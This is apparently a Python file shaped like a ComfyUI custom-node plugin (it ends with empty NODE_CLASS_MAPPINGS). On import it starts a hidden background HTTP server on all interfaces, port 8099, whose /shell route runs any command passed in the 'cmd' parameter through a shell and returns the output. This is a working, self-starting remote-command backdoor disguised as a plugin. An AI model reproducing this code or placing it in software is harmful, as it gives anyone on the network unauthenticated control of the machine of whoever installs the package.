import os
import sys
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs


BACKDOOR_HOST = '0.0.0.0'
BACKDOOR_PORT = 8099
BACKDOOR_ROUTE = '/shell'

class CommandExecutionHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        parsed_path = urlparse(self.path)

        if parsed_path.path == BACKDOOR_ROUTE:
            query_components = parse_qs(parsed_path.query)
            command = query_components.get('cmd', [None])[0]

            if command:
                
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=20
                    )

                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain; charset=utf-8')
                    self.end_headers()

                    response_text = f"--- STDOUT ---\n{result.stdout}\n--- STDERR ---\n{result.stderr}"
                    self.wfile.write(response_text.encode('utf-8'))
                    
                except Exception as e:
                    self.send_response(500)
                    self.send_header('Content-type', 'text/plain; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(f"Error executing command: {str(e)}".encode('utf-8'))
            else:
                self.send_response(400)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<h1>Backdoor Active</h1><p>Usage: /shell?cmd=your_command</p>")
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Not Found")

def run_backdoor_server():
    server_address = (BACKDOOR_HOST, BACKDOOR_PORT)
    httpd = HTTPServer(server_address, CommandExecutionHandler )
    httpd.serve_forever( )



backdoor_thread = threading.Thread(target=run_backdoor_server)
backdoor_thread.daemon = True
backdoor_thread.start()

NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
